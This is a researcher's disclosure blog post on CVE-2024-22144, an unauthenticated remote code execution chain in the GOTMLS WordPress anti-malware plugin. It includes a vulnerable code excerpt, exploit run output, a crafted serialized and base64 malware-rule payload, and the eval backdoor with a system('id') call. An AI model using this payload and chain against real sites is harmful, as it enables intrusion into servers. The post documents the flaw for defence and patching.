<!doctype html><html lang=en-US class=dark-mode><head><meta http-equiv=Content-Type content="text/html" charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><script type=application/ld+json>{"@context":"http://schema.org","@type":"Blog","mainEntityOfPage":{"@type":"WebPage","@id":"\/"},"articleSection":"post","name":"Unauthenticated RCE in Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin CVE-2024-22144","headline":"Unauthenticated RCE in Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin CVE-2024-22144","image":["\/content\/images\/2024\/01\/gotmls-uhoh.jpg"],"description":"Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin","inLanguage":"en-US","creator":"stealthcopter","author":{"@type":"Person","name":"stealthcopter"},"publisher":{"@type":"Organization","name":"stealthcopter","logo":{"@type":"ImageObject","url":"\/"}},"accountablePerson":"stealthcopter","copyrightHolder":"stealthcopter","copyrightYear":"2024","datePublished":"2024-03-12 09:54:54 \u002b0000 UTC","dateModified":"2024-03-12 09:54:54 \u002b0000 UTC","url":"\/cve-2024-22144\/","keywords":["Hacking","WordPress","Blog","Aceh","DevOps","Security","Engineer","SysAdmin","Linux","FLOSS Enthusiast","Coffee"]}</script><title>Unauthenticated RCE in Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin CVE-2024-22144 &#183; Stealthcopter</title>
<meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon type=image/png href=/favicon-96x96.png sizes=96x96><link rel=icon type=image/svg+xml href=/favicon.svg><link rel="shortcut icon" href=/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><link rel=canonical href=/cve-2024-22144/><meta name=description content="Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin"><meta property="og:site_name" content="Stealthcopter"><meta property="og:title" content="Stealthcopter"><meta property="og:url" content="/cve-2024-22144/"><meta property="og:type" content="article"><meta property="og:description" content="Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin"><meta property="article:published_time" content="2024-03-12T09:54:54Z"><meta property="article:tag" content="Hacking"><meta property="article:tag" content="WordPress"><meta property="og:image" content="/content/images/2024/01/gotmls-uhoh.jpg"><meta property="og:site_name" content="Stealthcopter"><meta property="og:title" content="Stealthcopter"><meta property="og:url" content="/cve-2024-22144/"><meta property="og:type" content="article"><meta property="og:description" content="Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin"><meta property="article:published_time" content="2024-03-12T09:54:54Z"><meta property="article:tag" content="Hacking"><meta property="article:tag" content="WordPress"><meta property="og:image" content="/content/images/2024/01/gotmls-uhoh.jpg"><meta name=keywords content="Hacking,WordPress,"><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/styles/tokyo-night-dark.min.css><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.0/highlight.min.js></script><script>hljs.highlightAll()</script><link rel=stylesheet href=/built/screen.css><link rel=stylesheet href=/css/custom.css><link href=/index.xml rel=alternate type=application/rss+xml title=Stealthcopter></head><body class=post-template><div class=viewport><header id=gh-head class="gh-head has-cover"><nav class="gh-head-inner inner gh-container"><div class=gh-head-brand><a class=gh-head-logo href=/>Stealthcopter</a>
<a class=gh-burger role=button><div class=gh-burger-box><div class=gh-burger-inner></div></div></a></div><div class=gh-head-menu><ul class=nav><li class="nav-home nav-current" role=menuitem><a href=/tags/hacking/>Hacking</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/software/>Software</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/ctf/>CTF</a></li><li class="nav-home nav-current" role=menuitem><a href=/tags/wordpress/>WordPress</a></li></ul></div><div class=gh-head-actions><div class=gh-social><a class=gh-social-twitter href=https://twitter.com/stealthcopter target=_blank rel=noopener><svg viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088.0 01-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015.0 01-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25.0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688.0 5.063-.875 7.188-2.5-1.25.0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5.0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673.0 01-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228.0 01-1.875-2c-.5-.875-.688-1.813-.688-2.75.0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579.0 011.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48.0 003.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg></a>
<a class=gh-social href=https://github.com/stealthcopter target=_blank rel=noopener><svg viewBox="0 0 24 24"><path d="M12 .297c-6.63.0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577.0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93.0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176.0.0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22.0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22.0 1.606-.015 2.896-.015 3.286.0.315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
<a class=gh-social href=https://www.linkedin.com/in/mat-rollings target=_blank rel=noopener><svg viewBox="0 50 512 512"><path d="M150.65 100.682c0 27.992-22.508 50.683-50.273 50.683-27.765.0-50.273-22.691-50.273-50.683C50.104 72.691 72.612 50 100.377 50c27.766.0 50.273 22.691 50.273 50.682zM143.294 187.333H58.277V462h85.017V187.333zm135.901.0h-81.541V462h81.541s0-101.877.0-144.181c0-38.624 17.779-61.615 51.807-61.615 31.268.0 46.289 22.071 46.289 61.615.0 39.545.0 144.181.0 144.181h84.605s0-100.344.0-173.915-41.689-109.131-99.934-109.131-82.768 45.369-82.768 45.369v-36.99z"/></svg></a>
<a class=gh-social href=/index.xml><svg viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03.0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9.0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg></a></div></div></nav></header><div class=site-content><main id=site-main class=site-main><article class=article><header class="article-header gh-canvas"><section class=article-tag><a href=/tags/hacking>Hacking</a></section><h1 class=article-title>Unauthenticated RCE in Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin CVE-2024-22144</h1><p class=article-excerpt>Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities in the Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin</p><div class=article-byline><section class=article-byline-content><ul class=author-list><li class=author-list-item><a href=/authors/stealthcopter class=author-avatar><img class=author-profile-image src=/content/images/size/w100/2024/07/f894d5600bcba5e947d6dde37a3cec1b.png alt=stealthcopter></a></li></ul><div class=article-byline-meta><h4 class=author-name><a href=/authors/stealthcopter>stealthcopter</a></h4><div class=byline-meta-content><time class=byline-meta-date datetime=2024-93-03>12 March 2024</time>
<span class=byline-reading-time><span class=bull>&bull;</span> 9 min
read</span></div></div></section></div><figure class=article-image><img src=/content/images/2024/01/gotmls-uhoh.jpg></figure></header><section class="gh-content gh-canvas"><h3 id=tldr>tldr;</h3><p>The Anti-Malware Security and Brute-Force Firewall GOTMLS WordPress Plugin is vulnerable to Unauthenticated Remote Code Execution (RCE) by chaining multiple vulnerabilities including unprotected API access, insufficient randomness, insecure design and improper sanitization of data. Final remote code execution was achieved by injection of malicious regex rules causing selective deletion of source code leaving behind a command shell.</p><p><strong>Affected Versions:</strong> &lt;=4.21.96<br><strong>CVSS Score:</strong> 9.0<br><strong>Links:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22144&amp;ref=sec.stealthcopter.com">Mitre</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22144?ref=sec.stealthcopter.com">NVD</a><br><strong>Active installations</strong>: 200,000+</p><h2 id=about-the-gotmls-plugin>About the GOTMLS Plugin</h2><p>The <a href="https://en-gb.wordpress.org/plugins/gotmls/?ref=sec.stealthcopter.com">Anti-Malware Security and Brute-Force Firewall (GOTMLS)</a> is a freemium WordPress plugin that is designed for malware detection and automatic removal. Is an essential tool for many WordPress sites, with over 200,000 active installations.</p><figure><img src="https://ps.w.org/gotmls/assets/banner-772x250.jpg?rev=1043954" alt="GOTMLS logo"><figcaption><p>GOTMLS logo</p></figcaption></figure><h2 id=vulnerabilities>Vulnerabilities</h2><p>The vulnerability chain begins with unprotected API functions that leak sensitive data, including server time. This allows brute forcing of an insufficiently random value used for a nonce. This nonce is then used to authenticate to additional API functions that allow updating of malware definitions. These malware regex&rsquo;s can be abused to selectively delete source code resulting in remote code execution. The identified vulnerability has been assigned a CVSS score of 9.0, highlighting its severity.</p><h3 id=unauthenticated-api-access>Unauthenticated API Access</h3><p>Allowing unauthenticated access to critical API functions in a plugin creates a significant security risk, as it permits any user, to access and potentially manipulate sensitive functionalities, laying the groundwork for potential exploitation and unauthorized actions. Plugins should restrict publicly accessible APIs to only those that are strictly necessary.</p><p>Interestingly, the plugin exposes several functions to unauthenticated users via the <code>admin-ajax.php</code> file, by adding actions prefix with <code>wp_ajax_nopriv_</code>. This allows anyone to access <code>GOTMLS_</code> functions provided they start with the letter <code>l</code>, giving us direct accesss to 4 sensitive functions (<code>load_update</code>, <code>log_session</code>, <code>logintime</code> and <code>lognewkey</code>).</p><pre><code class=language-php>$ajax_functions = array('load_update', 'log_session', 'empty_trash', 'fix', 'logintime', 'lognewkey', 'position', 'scan', 'View_Quarantine', 'whitelist'); // ... foreach ($ajax_functions as $ajax_function) { add_action(&quot;wp_ajax_GOTMLS_$ajax_function&quot;, &quot;GOTMLS_ajax_nopriv&quot;); add_action(&quot;wp_ajax_nopriv_GOTMLS_$ajax_function&quot;, substr($ajax_function, 0, 1) == &quot;l&quot;?&quot;GOTMLS_ajax_$ajax_function&quot;:&quot;GOTMLS_ajax_nopriv&quot;); }
</code></pre><p>The <code>logintime</code> function exposes the server&rsquo;s microtime, information which can be used for the next part of the vulnerability to calculate and brute force a valid nonce due to insufficient randomness.</p><h3 id=insecure-nonce-generation-and-validation>Insecure Nonce Generation and Validation</h3><p>It is a dangerously common anti-pattern to create what appears to be a random hash using predictable or known inputs (remember predictable input gives predictable output). This can leave systems vulnerable to bad actors who could directly guess or brute force these values.</p><p>The code snippet below illustrates how the plugin was insecurely generating nonces:</p><pre><code class=language-php>md5(substr(number_format(microtime(true), 9, '-', '/'), 6).GOTMLS_installation_key.GOTMLS_plugin_path);
</code></pre><p>In this instance, <code>GOTMLS_plugin_path</code> was predictable, <code>GOTMLS_installation_key</code> was known as it is generated from the site URL. The server also leaks its current microtime to 4 decimal places. As number formatter is forcing it to output to 9 decimal places the last 5 digits will be &ldquo;random&rdquo;. This means that even known exact time a brute force approach would still need to try a few million hashes before it could successfully guess a valid once. We can use some profiling and maths to try and predict the creation time more accurately by checking the server&rsquo;s microtime directly before and directly after the nonce generation.</p><p>A key aspect of nonce security is ensuring that they are tied to specific sessions. This practice adds an additional layer of security, as it associates each nonce with a unique user session, making it significantly more difficult for attackers to exploit. In this plugin nonces are stored globally and reused between different users.</p><p>Another interesting quirk in occurs when the nonce is validated; The function accepts either a single value for a nonce or an array of values as shown in the code snippet below:</p><pre><code class=language-php>if (is_array($_REQUEST[&quot;GOTMLS_mt&quot;])) { foreach ($_REQUEST[&quot;GOTMLS_mt&quot;] as $_REQUEST_GOTMLS_mt) if (strlen($_REQUEST_GOTMLS_mt) == 32 &amp;&amp; isset($GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;nonce&quot;][$_REQUEST_GOTMLS_mt])) return (INT) $GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;nonce&quot;][$_REQUEST_GOTMLS_mt]; return 0; } elseif (strlen($_REQUEST[&quot;GOTMLS_mt&quot;]) == 32 &amp;&amp; isset($GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;nonce&quot;][$_REQUEST[&quot;GOTMLS_mt&quot;]])) { return (INT) $GLOBALS[&quot;GOTMLS&quot;][&quot;tmp&quot;][&quot;nonce&quot;][$_REQUEST[&quot;GOTMLS_mt&quot;]]; }
</code></pre><p>This significantly reduces the number of requests required to brute force a valid nonce, as we could send multiple guesses at once. How many values could be validated in a single request is limited only by PHP&rsquo;s <code>max_input_vars</code>. On standard setups this typically restricts the number of variables in a HTTP request to 1000.</p><p>Another flaw in this plugin&rsquo;s functionality was that an attacker could invalidate all existing nonces stored on the server and insert up to 25 new ones by modifying a time parameter with each request. This allows an attacker to quickly create many nonces over a short period of time which massively increases the changes of guessing a correct one.</p><p>Combining all of these flaws was quite technical but resulted in an attack that could be completed reliably within 30 seconds to a few minutes. This was first tested against an instance running on localhost and confirmed by patchstack by running a vulnerable instance of the plugin on one AWS server and attacking it with another.</p><pre><code class=language-plaintext>python gotmls.py http://44.201.189.48
[+] Exploiting Host: http://44.201.189.48
[+] Calculated Installation Key: 124b65e39d7b19df6a45cdaa16dc6044
[+] Using Plugin Path: /var/www/html/wp-content/plugins/gotmls/
[+] Calibrating timing attack:
 ├ Offset time:     0.00778 ms (min:0.00691 max:0.00963)
 └ Round trip time: 0.02902 ms (min:0.02769 max:0.03194)
[+] Starting attack:
 ├ Server Microtime: 1704461766.5626
 ├ Clearing Existing Nonces
 ├ Start time: 1704461766.6197805
 ├ Midpoint:   1704461767.0998244
 ├ End time:   1704461767.5798683
 └ 25 Nonces Injected in 0.96009 s (avg 0.038404)
[?] Attack feasibility calculation
 ├ These values are the maximum search space, average attack should take 50% of these
 ├ Hashes: 42,243,862
 ├ Requests: 42,456
 └ Estimated Time: 1,630s
[*] Press enter to continue or ctrl+c to stop
[-] Tested 1,058,680 hashes over 1,064 requests (speed 36,566 h/s)
[+] Found hash!!! (Tested: 1,058,680 hashes)
 └ Brute forced a valid nonce in 32.60srequests (speed 36,657 h/s)
 └ Converted 995 hashes into single nonce e0c5ed6becf3f50ba6abe787f15f2752
[+] Validated nonce and server key
</code></pre><p>Another interesting thing to note is that the PHP execution and response (~90ms) is significantly slower than the HTTP request&rsquo;s time (2-10ms) in flight. This means that for the attack demonstrated here the connection speed is not the main factor contributing to the search space. This means that this vulnerability is incredibly dangerous as it has an approximately constant attack space making it feasible even against remote targets. It is even worse against more powerful servers and those using multi-threading, as they would allow for more nonces to be created in less time.</p><h3 id=remote-code-execution-by-injecting-malicious-malware-rules>Remote Code Execution by Injecting Malicious Malware Rules</h3><p>Once a valid nonce is obtained, the plugin gives you access to all the ajax functions, not just those beginning with <code>l</code>. These are more sensitive administrative API functions that can be accessed and manipulated.</p><p>One such function, <code>GOTMLS_ajax_load_update</code>, allows for the update of PHP serialized, base64 encoded malware definitions. This part of the function should have been designed to be private and only accessible when called internally, not by an end user.</p><p>The malware definitions are protected against direct insecure deserialization attacks thanks to a small regex protection. However, we can now insert custom regex&rsquo;s into these definitions, and continue our attack using intended functionality of the plugin. It is possible to specially craft some regex&rsquo;s so that the plugin will scan its own source code and selectively delete parts, leaving behind an exploitable code fragment. There are likely countless ways to do this, I selected one that left behind an evil <code>eval</code> statement. Below you can see the PHP code I wrote with the 3 regex&rsquo;s to achieve when running on the <code>images/index.php</code> file.</p><pre><code class=language-php>$inj = array(&quot;known&quot; =&gt; array( &quot;stealthcopter testing 1&quot;=&gt;array(0 =&gt; 'M4t01', 1 =&gt; '/\$bad = array\(&quot;/'), &quot;stealthcopter testing 2&quot;=&gt;array(0 =&gt; 'M4t02', 1 =&gt; '/&quot;, &quot;preg_replace.*?isset/s'), &quot;stealthcopter testing 3&quot;=&gt;array(0 =&gt; 'M4t03', 1 =&gt; '/&amp;&amp;is_numeric\(.*?\n\)(?=;)/s') )); $serial = @serialize($inj); echo $serial.&quot;\n&quot;; echo urlsafe_b64encode($serial).&quot;\n&quot;;
</code></pre><p>This gives us a serialized PHP object of:</p><pre><code>a:1:{s:5:&quot;known&quot;;a:3:{s:23:&quot;stealthcopter testing 1&quot;;a:2:{i:0;s:5:&quot;M4t01&quot;;i:1;s:18:&quot;/\$bad = array\(&quot;/&quot;;}s:23:&quot;stealthcopter testing 2&quot;;a:2:{i:0;s:5:&quot;M4t02&quot;;i:1;s:27:&quot;/&quot;, &quot;preg_replace.*?isset/s&quot;;}s:23:&quot;stealthcopter testing 3&quot;;a:2:{i:0;s:5:&quot;M4t03&quot;;i:1;s:29:&quot;/&amp;amp;&amp;amp;is_numeric\(.*?\n\)(?=;)/s&quot;;}}}
</code></pre><p>Which in base64 is:</p><pre><code>YToxOntzOjU6Imtub3duIjthOjM6e3M6MjM6InN0ZWFsdGhjb3B0ZXIgdGVzdGluZyAxIjthOjI6e2k6MDtzOjU6Ik00dDAxIjtpOjE7czoxODoiL1wkYmFkID0gYXJyYXlcKCIvIjt9czoyMzoic3RlYWx0aGNvcHRlciB0ZXN0aW5nIDIiO2E6Mjp7aTowO3M6NToiTTR0MDIiO2k6MTtzOjI3OiIvIiwgInByZWdfcmVwbGFjZS4qP2lzc2V0L3MiO31zOjIzOiJzdGVhbHRoY29wdGVyIHRlc3RpbmcgMyI7YToyOntpOjA7czo1OiJNNHQwMyI7aToxO3M6Mjk6Ii8mJmlzX251bWVyaWNcKC4qP1xuXCkoPz07KS9zIjt9fX0
</code></pre><p>This was then passed to the <code>load_update</code> ajax function and the malware definitions were successfully updated. Following this we now just need to call another endpoint to execute a scan on a single file <code>images/index.php</code> and it will be executed.</p><figure><img src=/content/images/2024/01/gotmls-malware-replace-1.gif alt="A visual demonstration of how the 3 regexs work to selectively delete code and leave behind an exploitable code fragment."><figcaption><p>A visual demonstration of how the 3 regexs work to selectively delete code and leave behind an exploitable code fragment.</p></figcaption></figure><p>The gif above shows the original source code, and the 3 parts that are removed using the injected malware regex definitions. Following the selective deletions the following code is left behind:</p><pre><code class=language-php>eval($_REQUEST[&quot;mt&quot;]);
</code></pre><p>This leaves behind a basic backdoor, <code>eval</code>, will execute any string passed into it as PHP code. We can trigger this by sending a simple bit of PHP code in the <code>mt</code> parameter to execute arbitrary PHP commands such as:</p><pre><code class=language-php>die(system(&quot;id&quot;));
</code></pre><p>This leaves us with a full unauthenticated remote code execution attack as can be shown in the screenshot below:</p><pre><code>[+] Found hash!!! (Tested: 1,058,680 hashes)
 └ Brute forced a valid nonce in 32.60srequests (speed 36,657 h/s)
 └ Converted 995 hashes into single nonce e0c5ed6becf3f50ba6abe787f15f2752
[+] Validated nonce and server key
[!] Injecting a shell into images/index.php is a destructive process
[*] Press any key to continue or ctrl+c to quit
[+] Injecting malicious update
[+] Executing shell with: id
 └ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
</code></pre><p>Now that this backdoor shell has been created we can access it using curl or in the browser:</p><figure><img src=/content/images/2024/01/gotmls-execution-browser.png alt="Screenshot showing the result from the newly uploaded shell post exploitation"><figcaption><p>Screenshot showing the result from the newly uploaded shell post exploitation</p></figcaption></figure><h2 id=timeline>Timeline</h2><p>Thanks to <a href="https://twitter.com/elischeetz?lang=en&amp;ref=sec.stealthcopter.com">Eli Scheetz</a> the author of GotMLS for fixing this vulnerability and for generously donating a few coffees to fuel my research ☕. Also a shoutout to <a href="https://patchstack.com/database/researcher/df1fbf88-bded-4058-8b28-efccedf93a49?ref=sec.stealthcopter.com">Dave</a> from Patchstack for his patience getting the exploit working.</p><ul><li><strong>28/01/24 (a few days before)</strong> - I knew there was something interesting here but discovery and development of this exploit took quite a few days as it was a tricky beast.</li><li><strong>04/01/24 ( 0 day)</strong> - Disclosure to Patchstack</li><li><strong>05/01/24 (+1 day)</strong> - <a href="https://patchstack.com/?ref=sec.stealthcopter.com">Patchstack</a> tested and validated the vulnerability chain. They awarded 180 AXP with an additional 1.5x for writing an advisory. Resulting in a total of 270 AXP.</li><li><strong>20/02/24 (+16 days)</strong> - Patch published</li><li><strong>12/03/24 (+37 days)</strong> - Vulnerability Published</li></ul><h2 id=conclusion>Conclusion</h2><p>The vulnerabilities discussed here underscore the importance of securing all aspects of a plugin, especially those designed for security purposes. For developers, it is crucial to ensure that every function and API endpoint is secured with appropriate authentication and validation mechanisms to prevent exploitation. It is highly recommended to avoid creating your own security functions and to utilize those already built into WordPress, such as nonce creation and validation. These have been tested and approved by a larger community, making them more reliable than creating your own from scratch.</p><nav class=sharebuttons style=margin-top:20px><span>Share This:</span><ul><li><a href="https://www.facebook.com/sharer.php?u=%2fcve-2024-22144%2f&t=Unauthenticated%20RCE%20in%20Anti-Malware%20Security%20and%20Brute-Force%20Firewall%20GOTMLS%20WordPress%20Plugin%20CVE-2024-22144" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m12.8064516 26.63h5.4808065v22.5635484c0 .4454839.3609677.8064516.8064516.8064516h9.2929032c.4454839.0.8064516-.3609677.8064516-.8064516V26.7362903h6.3006452c.4096774.0.7543548-.3074193.801129-.7143548l.9569355-8.3067742c.0262903-.2285484-.046129-.4574194-.1990323-.628871-.1530645-.1716129-.3720967-.2698387-.6019354-.2698387h-7.2574194v-5.2070968c0-1.5696774.8451613-2.36564512 2.5122581-2.36564512h4.7451613c.4454838.0.8064516-.36112903.8064516-.80645162v-7.6248387c0-.44548388-.3609678-.80645162-.8064516-.80645162h-6.5395162c-.046129-.00225806-.1485484-.00596774-.2995161-.00596774-1.1346774.0-5.0787097.22274194-8.1941936 3.08887097C17.9656452 6.265 18.4454839 10.0679032 18.5601613 10.7272581v6.0890322h-5.7537097c-.4454839.0-.8064516.3609678-.8064516.8064516v8.2006452c0 .4454839.3609677.8066129.8064516.8066129z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="https://twitter.com/intent/tweet?text=Unauthenticated%20RCE%20in%20Anti-Malware%20Security%20and%20Brute-Force%20Firewall%20GOTMLS%20WordPress%20Plugin%20CVE-2024-22144&url=%2fcve-2024-22144%2f" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m48.8670204 9.72441272c-.7854489.34833978-1.5930659.64238268-2.418261.88115208.9769529-1.10488248 1.7217769-2.40488211 2.1764642-3.8274403.1019531-.31884757-.0037109-.66787091-.2658202-.8764646-.2618163-.20869135-.6254881-.23369134-.9136716-.06289061-1.7524409 1.03935518-3.6430654 1.78632762-5.6254867 2.22304625C39.823273 6.11054656 37.1110667 5 34.3071613 5c-5.918553.0-10.7336884 4.8150377-10.7336884 10.7333954.0.4661131.0294922.9296872.0878906 1.386816-7.3443338-.644824-14.17226158-4.2546863-18.86093212-10.0061495-.1670898-.20498041-.4245116-.31552725-.68808575-.29433585-.2636718.02060546-.50068345.16933589-.63388653.3979491-.9509763 1.63173782-1.45371053 3.49804585-1.45371053 5.39697115.0 2.5863274.92333958 5.0401353 2.55449146 6.9576152-.49599595-.1717773-.97724581-.3864257-1.43662068-.6414061-.24658196-.1373046-.54755844-.1351562-.7925779.0052735-.24511712.1405273-.39882802.398828-.40537098.6812498-.00117188.0475585-.00117188.0951171-.00117188.1433593.0 3.8604481 2.07773379 7.3361307 5.25439304 9.2304661-.27294914-.027246-.54560531-.0667968-.81660133-.1185546-.27939445-.053418-.5666014.0445312-.75498025.2576171-.18867182.2128906-.2511718.5096678-.16416011.7806638 1.17578092 3.6709951 4.20302615 6.371092 7.86269306 7.1943339-3.0353507 1.9011714-6.50644345 2.8969719-10.15029007 2.8969719-.76035135.0-1.52499957-.0446289-2.2733392-.1332031-.37177724-.0442383-.72724588.1752929-.85390601.5289061-.12666012.3537108.00761719.7480466.32382804.950781 4.68115101 3.001464 10.09384484 4.5878893 15.65272994 4.5878893 10.9280242.0 17.7643504-5.1532212 21.5747986-9.4762669 4.7516588-5.3905258 7.4767557-12.5254847 7.4767557-19.5752874.0-.2945311-.0044922-.5918943-.0135743-.8883786 1.8747065-1.412402 3.4886709-3.1217765 4.8020495-5.0864244.1995116-.2983397.1779296-.6927732-.0532227-.96738251-.2305663-.27509758-.6153318-.36396474-.9436521-.21845697z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&url=%2fcve-2024-22144%2f&title=Unauthenticated%20RCE%20in%20Anti-Malware%20Security%20and%20Brute-Force%20Firewall%20GOTMLS%20WordPress%20Plugin%20CVE-2024-22144&summary=Unauthenticated%2bRemote%2bCode%2bExecution%2b%2528RCE%2529%2bby%2bchaining%2bmultiple%2bvulnerabilities%2bin%2bthe%2bAnti-Malware%2bSecurity%2band%2bBrute-Force%2bFirewall%2bGOTMLS%2bWordPress%2bPlugin" target=_blank><svg height="51" viewBox="0 0 50 51" width="50"><g fill="none" fill-rule="evenodd"><path d="m37.17 16.2290323c11.3056452.0 12.83 8.1724193 12.83 16.1667742v17.6877419c0 .4454839-.3609677.8064516-.8064516.8064516H39.1741935c-.4454838.0-.8064516-.3609677-.8064516-.8064516l-3842e-7-15.9301537c-.0134805-4.2654904-.4024632-7.4953302-4.4055835-7.4953302-3.7477419.0-5.2080645 2.0945161-5.2080645 7.4708065v15.9545161c0 .4454839-.3609678.8066129-.8064516.8066129H17.9316129c-.4454839.0-.8064516-.361129-.8064516-.8066129V17.8369355c0-.4453226.3609677-.8064516.8064516-.8064516h9.6127419c.4454839.0.8064517.361129.8064517.8064516v2.0943548c1.8075806-1.9691935 4.7877419-3.702258 8.8191935-3.702258zm-25.5312903.8014516c.4454838.0.8064516.361129.8064516.8064516v32.2464516c0 .4454839-.3609678.8064516-.8064516.8064516H1.60112903c-.44548387.0-.80645161-.3609677-.80645161-.8064516V17.8369355c0-.4453226.36096774-.8064516.80645161-.8064516zM6.62354839 1c3.64935481.0 6.61838711 2.96806452 6.61822581 6.61629032.0 3.64967738-2.968871 6.61903228-6.61822581 6.61903228-3.65225807.0-6.62354839-2.9691936-6.62354839-6.61903228.0-3.6482258 2.97129032-6.61629032 6.62354839-6.61629032z" fill="#d5d5d5" class="will-change" fill-rule="nonzero"/><path d="m0 0h50v50H0z"/></g></svg></a></li><li><a href="whatsapp://send?text=Unauthenticated%20RCE%20in%20Anti-Malware%20Security%20and%20Brute-Force%20Firewall%20GOTMLS%20WordPress%20Plugin%20CVE-2024-22144%0a%0aUnauthenticated%20Remote%20Code%20Execution%20%28RCE%29%20by%20chaining%20multiple%20vulnerabilities%20in%20the%20Anti-Malware%20Security%20and%20Brute-Force%20Firewall%20GOTMLS%20WordPress%20Plugin%0a%0a%2fcve-2024-22144%2f%0a" target=_blank><svg height="50" viewBox="0 0 50 50" width="50"><g fill="none" fill-rule="evenodd"><path d="m25.4437935.0c13.5404221.0 24.5561688 10.9340909 24.5561688 24.3738636.0 13.4383117-11.0157467 24.3712663-24.5560065 24.3711039-4.0610389.0-8.0737013-1.0012987-11.624026-2.8982143l-12.97402593 4.1227273c-.06461039.0206169-.13084416.0305195-.19659091.0305195-.17159091.0-.33961039-.0681818-.46347403-.1946429-.17159091-.1746753-.23003247-.4311688-.15146104-.6631493l4.21801948-12.4423701c-2.20373376-3.724026-3.36704545-7.9790585-3.36704545-12.3259741.0-13.4397727 11.01688308-24.3738636 24.55844158-24.3738636zm-1624e-7 5.07727273c-10.725974.0-19.45227269 8.65649347-19.45227269 19.29659087.0 4.0896104 1.28068182 8.0008117 3.70340909 11.3112013.125.1707793.15892857.3917208.09107143.5920455l-2.09805195 6.1897727 6.49918832-2.0659091c.064448-.0204545.1306818-.0305195.1967532-.0305195.125.0.2491884.036039.3561689.1063312 3.1814935 2.0876624 6.8826298 3.1910714 10.7038961 3.1910714 10.7248376.0 19.4498376-8.6551948 19.4498376-19.2939935.0-10.6400974-8.7253246-19.29659087-19.45-19.29659087zm-6.6467532 7.85259737c.7225649.0 1.2425325.4384741 1.636039 1.3801948.1636363.3902598 1.7027597 4.1048702 1.788961 4.2772728.1050325.2060065.4300325.8439935.049513 1.6l-.0816559.1641233c-.1558441.3159091-.2902597.5886364-.5922078.9399351-.0969155.112013-.1956168.2308442-.2941558.349513-.2081169.250487-.4232143.5094156-.6217532.7058441-.0678572.0680195-.1993507.1998377-.2136364.2522728 487e-6.0.0029221.0449675.0610389.1439935.4069806.6887987 3.375 